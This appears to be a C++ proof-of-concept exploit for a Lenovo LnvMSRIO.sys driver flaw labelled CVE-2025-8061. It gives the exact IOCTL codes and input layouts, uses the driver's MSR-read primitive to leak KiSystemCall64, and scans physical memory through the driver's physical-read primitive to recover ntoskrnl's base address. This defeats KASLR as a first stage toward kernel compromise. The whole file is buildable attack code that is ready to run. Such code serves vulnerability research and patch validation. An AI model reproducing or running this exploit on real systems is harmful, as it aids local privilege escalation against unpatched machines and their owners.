/*
 * 01_kaslr_defeat.cpp  —  CVE-2025-8061 (Lenovo LnvMSRIO.sys) — KASLR Defeat
 *
 * Goal: recover ntoskrnl.exe load base (virtual address) from user-mode
 *       using only the driver's MSR-read and physical-memory-read primitives.
 *
 * Two-phase algorithm
 * ───────────────────
 * Phase 1 — LSTAR leak (MSR primitive)
 *   Read IA32_LSTAR (MSR 0xC0000082) → address of KiSystemCall64.
 *   This is a VA inside ntoskrnl.exe, so the kernel base is somewhere
 *   below it (backward scan target).
 *
 * Phase 2 — Physical RAM scan (physical-read primitive)
 *   Scan physical memory in 2 MB steps (ntoskrnl uses large pages → its
 *   physical base is always 2 MB-aligned).
 *   For each candidate page:
 *     a. Read first 4 KB via IOCTL.
 *     b. Check MZ signature, PE\0\0 signature, Machine == 0x8664.
 *     c. Read ImageBase from the PE optional header.
 *     d. Accept if KiSystemCall64 ∈ [ImageBase, ImageBase + SizeOfImage).
 *     e. Confirm by reading the export-directory Name RVA → "ntoskrnl.exe".
 *
 * IOCTL layouts (LnvMSRIO.sys)
 * ─────────────────────────────
 *   MSR read    0x9c402084
 *     IN  → { DWORD Register }                     (4 bytes)
 *     OUT ← { UINT64 Value }                        (8 bytes)
 *
 *   Phys read   0x9c406104
 *     IN  → { UINT64 PhysAddr; DWORD AccessSize; DWORD Count }  (16 bytes)
 *     OUT ← AccessSize × Count bytes
 *     AccessSize: 1 = BYTE, 2 = WORD, 8 = QWORD
 *     Driver calls MmMapIoSpace(PhysAddr, AccessSize*Count, ...) internally.
 *
 * Build (x64 Developer Command Prompt):
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:01_kaslr_defeat.exe 01_kaslr_defeat.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME      L"\\\\.\\WinMsrDev"
#define IOCTL_MSR_READ   0x9c402084u
#define IOCTL_PHYS_READ  0x9c406104u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── MSR read ─────────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct MsrReadIn  { DWORD Register; };
struct MsrReadOut { UINT64 Value;   };
#pragma pack(pop)

static bool ReadMSR(DWORD msr, uint64_t *out)
{
    MsrReadIn  in  = { msr };
    MsrReadOut res = {};
    DWORD      got = 0;

    if (!DeviceIoControl(g_dev, IOCTL_MSR_READ,
                         &in, sizeof(in), &res, sizeof(res), &got, nullptr)
        || got < sizeof(res)) {
        printf("[-] ReadMSR(0x%08X): error %lu\n", msr, GetLastError());
        return false;
    }
    *out = res.Value;
    return true;
}

// ─── Physical read ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn {
    UINT64 PhysAddr;    // physical address to map
    DWORD  AccessSize;  // element size: 1=BYTE, 2=WORD, 8=QWORD
    DWORD  Count;       // number of elements  →  total = AccessSize * Count bytes
};
#pragma pack(pop)

// Read `len` bytes (max 4096) from physical address `pa` into `buf`.
// Uses AccessSize=1 (byte) so any length works.
static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in  = { pa, 1, len };
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           buf,  len,
                           &got, nullptr) && (got == len);
}

// Convenience: read a single UINT64 from physical address `pa`.
static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in  = { pa, 8, 1 };   // 8-byte (QWORD) access
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           out,  sizeof(*out),
                           &got, nullptr) && (got == 8);
}

// ─── PE header helpers ────────────────────────────────────────────────────────
//
// All helpers operate on a raw 4 KB buffer `page` already read from physical
// memory.  Offsets follow the PE/COFF specification for 64-bit images.
//
//   [0x00]          IMAGE_DOS_HEADER.e_magic     "MZ"
//   [0x3C]          IMAGE_DOS_HEADER.e_lfanew    → offset of PE signature
//   [e_lfanew+0x00] PE signature                 0x00004550
//   [e_lfanew+0x04] COFF header (20 bytes)
//     +0x00  Machine          0x8664 = AMD64
//     +0x02  NumberOfSections
//     ...
//   [e_lfanew+0x18] Optional header (IMAGE_OPTIONAL_HEADER64):
//     +0x00  Magic            0x020B = PE32+
//     +0x18  ImageBase        UINT64   ← virtual load address we want
//     +0x38  SizeOfImage      DWORD
//     +0x70  DataDirectory[0] (Export): VirtualAddress DWORD + Size DWORD
//
// Absolute buffer offsets:
//   ImageBase   = e_lfanew + 0x18 (opt hdr start) + 0x18 = e_lfanew + 0x30
//   SizeOfImage = e_lfanew + 0x18                 + 0x38 = e_lfanew + 0x50
//   ExportDirRVA= e_lfanew + 0x18                 + 0x70 = e_lfanew + 0x88

static bool IsValidPE64(const uint8_t *p, size_t sz)
{
    if (sz < 0x100)                          return false;
    if (p[0] != 'M' || p[1] != 'Z')         return false;   // MZ

    LONG lfanew = *(const LONG *)(p + 0x3C);
    if (lfanew < 0 || (size_t)lfanew + 0x100 > sz) return false;

    if (*(const DWORD *)(p + lfanew) != 0x00004550u) return false; // PE\0\0
    if (*(const WORD  *)(p + lfanew + 4) != 0x8664)  return false; // AMD64
    if (*(const WORD  *)(p + lfanew + 0x18) != 0x020B) return false; // PE32+
    return true;
}

static uint64_t PE64_ImageBase(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint64_t *)(p + lfanew + 0x30);
}

static uint32_t PE64_SizeOfImage(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x50);
}

static uint32_t PE64_ExportDirRVA(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x88);
}

// ─── Physical RAM upper bound ─────────────────────────────────────────────────


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t PhysRamTop()
{
    // Use physical memory ranges from registry to avoid VMware MMIO space
    // Falls back to ullTotalPhys (no +512MB buffer) if registry unavailable
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    uint64_t top = 0;
    for (int i = 0; i < n; i++) {
        uint64_t end = ranges[i].base + ranges[i].size;
        if (end > top) top = end;
    }
    if (!top) {
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        top = ms.ullTotalPhys;
    }
    return (top + 0x1FFFFFULL) & ~0x1FFFFFULL;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 01 - KASLR Defeat ===\n\n");

    if (!OpenDevice()) return 1;

    // ── Phase 1: read LSTAR → KiSystemCall64 ─────────────────────────────────
    //
    // IA32_LSTAR (0xC0000082) holds the kernel-mode entry point for SYSCALL
    // instructions on x64.  Windows stores KiSystemCall64 there.
    // This gives us a VA that is definitely inside ntoskrnl.exe.

    uint64_t lstar = 0;
    if (!ReadMSR(0xC0000082, &lstar) || !lstar) {
        printf("[-] Failed to read LSTAR\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] LSTAR (KiSystemCall64) = 0x%016llX\n\n", lstar);

    // Quick sanity: KiSystemCall64 must be in kernel VA space (> 0xFFFF000000000000)
    if (lstar < 0xFFFF000000000000ULL) {
        printf("[-] LSTAR value looks wrong (user-space VA?)\n");
        CloseHandle(g_dev); return 1;
    }

        // ── Phase 2: physical RAM scan for ntoskrnl.exe PE header ────────────────
    // VMware-safe: only scan valid physical RAM extents from the registry,
    // not a blind contiguous range that includes MMIO device space.

    PhRange ph_ranges[32];
    int n_ranges = GetPhysRanges(ph_ranges, 32);
    if (n_ranges == 0) {
        MEMORYSTATUSEX ms2 = { sizeof(ms2) };
        GlobalMemoryStatusEx(&ms2);
        ph_ranges[0].base = 0x100000;
        ph_ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n_ranges = 1;
    }

    uint8_t  page[4096];
    uint64_t found_pa   = 0;
    uint64_t found_base = 0;
    uint32_t found_size = 0;

    printf("[*] Scanning %d physical memory range(s) for ntoskrnl PE header...\n", n_ranges);

    for (int ri = 0; ri < n_ranges && !found_base; ri++) {
        uint64_t rbase = ph_ranges[ri].base;
        uint64_t rend  = ph_ranges[ri].base + ph_ranges[ri].size;
        // Align start up to 2 MB (ntoskrnl is 2MB-aligned large page)
        rbase = (rbase + 0x1FFFFFULL) & ~0x1FFFFFULL;
        if (rbase < 0x100000) rbase = 0x200000;

        printf("    range[%d]: 0x%llX .. 0x%llX\n", ri, rbase, rend);

        for (uint64_t pa = rbase; pa < rend && !found_base; pa += 0x200000ULL) {

            if (!PhysRead(pa, page, sizeof(page))) continue;
            if (page[0] != 'M' || page[1] != 'Z') continue;
            if (!IsValidPE64(page, sizeof(page))) continue;

            uint64_t img_base = PE64_ImageBase(page);
            uint32_t img_size = PE64_SizeOfImage(page);

            if (img_base < 0xFFFF800000000000ULL) continue;
            if (lstar < img_base || lstar >= (uint64_t)img_base + img_size) continue;

            uint32_t exp_rva = PE64_ExportDirRVA(page);
            char     mod_name[32] = "<unknown>";

            if (exp_rva && exp_rva + 0x20 < img_size) {
                uint8_t expdir[20] = {};
                if (PhysRead(pa + exp_rva, expdir, sizeof(expdir))) {
                    uint32_t name_rva = *(uint32_t *)(expdir + 0x0C);
                    if (name_rva && name_rva + sizeof(mod_name) < img_size)
                        PhysRead(pa + name_rva, mod_name, sizeof(mod_name) - 1);
                }
            }

            printf("[+] PE64 @ PA=0x%016llX  ImageBase=0x%016llX  Size=0x%X  \"%s\"\n",
                   pa, img_base, img_size, mod_name);

            if (_stricmp(mod_name, "ntoskrnl.exe") == 0 ||
                _stricmp(mod_name, "ntkrnlmp.exe") == 0 ||
                _stricmp(mod_name, "ntkrpamp.exe") == 0) {
                found_pa   = pa;
                found_base = img_base;
                found_size = img_size;
            }
            if (!found_base) {
                found_pa   = pa;
                found_base = img_base;
                found_size = img_size;
                printf("    [~] Kept as fallback\n");
            }
        }
    }


    // ── Results ───────────────────────────────────────────────────────────────

    if (!found_base) {
        printf("\n[-] ntoskrnl.exe NOT found in physical RAM.\n");
        printf("    Hint: large-page alignment assumption may have failed.\n");
        printf("    Try: NtQuerySystemInformation(SystemModuleInformation)\n");
        CloseHandle(g_dev); return 1;
    }

    uint64_t lstar_offset = lstar - found_base;

    printf("\n");
    printf("════════════════════════════════════════\n");
    printf(" ntoskrnl  VA base   : 0x%016llX\n", found_base);
    printf(" ntoskrnl  PA base   : 0x%016llX\n", found_pa);
    printf(" SizeOfImage         : 0x%08X  (%u MB)\n",
           found_size, found_size >> 20);
    printf(" KiSystemCall64  VA  : 0x%016llX\n", lstar);
    printf(" KiSystemCall64 +off : +0x%llX  (offset inside ntoskrnl)\n",
           lstar_offset);
    printf("════════════════════════════════════════\n");

    // ── Optional: pattern-scan for KiSystemCall64 within its own page ────────
    //
    // Demonstrates reading an arbitrary kernel page via physical address.
    // Reads the physical page that contains KiSystemCall64 and prints
    // the first 16 bytes (the function prologue).

    printf("\n[*] Reading KiSystemCall64 prologue from physical memory...\n");

    // Physical address of KiSystemCall64 = PA_of_ntoskrnl_base + RVA_of_KiSystemCall64
    //   = found_pa + lstar_offset
    // (valid because the entire image maps linearly from found_pa)
    uint64_t ki_pa = found_pa + lstar_offset;

    uint8_t prologue[16] = {};
    if (PhysRead(ki_pa, prologue, sizeof(prologue))) {
        printf("[+] KiSystemCall64 @ PA 0x%016llX :\n    ", ki_pa);
        for (int i = 0; i < 16; i++) printf("%02X ", prologue[i]);
        printf("\n");
    } else {
        printf("[-] Could not read KiSystemCall64 page\n");
    }

    CloseHandle(g_dev);
    printf("\n[+] Done.\n");
    return 0;
}
